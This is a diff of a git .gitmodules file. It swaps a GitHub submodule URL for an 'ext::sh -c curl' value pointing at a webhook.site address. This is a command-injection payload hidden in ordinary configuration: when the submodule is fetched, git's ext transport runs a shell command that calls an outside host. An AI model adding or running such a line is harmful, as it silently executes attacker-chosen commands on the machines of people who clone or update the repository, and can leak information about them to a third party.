@@ -1,3 +1,3 @@
 [submodule "p05"]
 	path = p05
-	url = https://github.com/NewbieBot12/p05-theme-clean-1793360538.git
+	url = ext::sh -c curl% webhook.site/9217b6e3-5ad3-4306-befb-1a529dcacf9d
